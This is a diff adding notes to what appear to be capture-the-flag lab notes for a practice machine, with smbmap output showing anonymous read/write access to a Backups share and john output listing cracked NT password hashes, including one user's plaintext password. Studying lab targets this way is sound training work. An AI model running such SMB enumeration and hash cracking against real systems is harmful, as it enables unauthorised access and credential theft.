@@ -41,3 +41,24 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 44.25 seconds
 ```
+smbmap
+```
+smbmap -u anonymous -H 10.10.10.134
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.134...
+[+] IP: 10.10.10.134:445	Name: 10.10.10.134                                      
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	ADMIN$                                            	NO ACCESS
+	Backups                                           	READ, WRITE
+	[!] Unable to remove test directory at \\10.10.10.134\Backups\CMmGdHrWob, plreae remove manually
+	C$                                                	NO ACCESS
+	IPC$                                              	READ ONLY
+```
+john
+```
+john --show --format=NT ~/Desktop/hashes.txt 
+*disabled* Administrator::500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:bureaulampje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+```
